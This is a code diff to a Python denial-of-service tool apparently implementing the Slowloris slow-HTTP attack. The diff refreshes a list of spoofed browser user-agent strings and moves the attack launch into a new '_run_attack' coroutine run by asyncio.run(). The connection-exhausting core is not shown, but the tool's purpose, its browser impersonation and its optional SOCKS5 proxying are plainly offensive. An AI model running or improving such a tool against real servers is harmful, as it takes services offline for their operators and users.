@@ -62,17 +62,16 @@ structlog.configure(
 log = structlog.get_logger()
 
 
-# Modern user agents (2024) - Using tuple for immutability
+# Modern user agents (2026) - Using tuple for immutability
 USER_AGENTS = (
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15.7; rv:152.0) Gecko/20100101 Firefox/152.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.4078.80",
 )
 
 # Optional SOCKS5 support
@@ -382,6 +381,28 @@ class Slowloris:
         self._shutdown.set()
 
 
+async def _run_attack(config: Config) -> None:
+    """Set up signal handlers on the running loop and run the attack."""
+    slowloris = Slowloris(config)
+
+    def signal_handler() -> None:
+        log.info("Received interrupt signal, shutting down")
+        slowloris.stop()
+
+    # Register signal handlers on the running loop (asyncio-native)
+    loop = asyncio.get_running_loop()
+    try:
+        loop.add_signal_handler(signal.SIGINT, signal_handler)
+        loop.add_signal_handler(signal.SIGTERM, signal_handler)
+    except NotImplementedError:
+        # Windows doesn't support add_signal_handler
+        import signal as sig
+        sig.signal(sig.SIGINT, lambda s, f: signal_handler())
+        sig.signal(sig.SIGTERM, lambda s, f: signal_handler())
+
+    await slowloris.run()
+
+
 # Modern CLI using Click instead of argparse
 @click.command()
 @click.argument("host", required=False)
@@ -479,35 +500,11 @@ def main(
         click.echo(f"Error: {e}", err=True)
         sys.exit(1)
     
-    # Setup asyncio
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    
-    slowloris = Slowloris(config)
-    
-    # Use asyncio-native signal handling
-    def signal_handler() -> None:
-        log.info("Received interrupt signal, shutting down")
-        slowloris.stop()
-    
-    # Register signal handlers using asyncio native method
+    # Run using the modern asyncio.run() entry point
     try:
-        loop.add_signal_handler(signal.SIGINT, signal_handler)
-        loop.add_signal_handler(signal.SIGTERM, signal_handler)
-    except NotImplementedError:
-        # Windows doesn't support add_signal_handler
-        import signal as sig
-        sig.signal(sig.SIGINT, lambda s, f: signal_handler())
-        sig.signal(sig.SIGTERM, lambda s, f: signal_handler())
-    
-    try:
-        loop.run_until_complete(slowloris.run())
+        asyncio.run(_run_attack(config))
     except KeyboardInterrupt:
         log.info("Interrupted, shutting down")
-        slowloris.stop()
-        loop.run_until_complete(asyncio.sleep(0.5))
-    finally:
-        loop.close()
 
 
 if __name__ == "__main__":
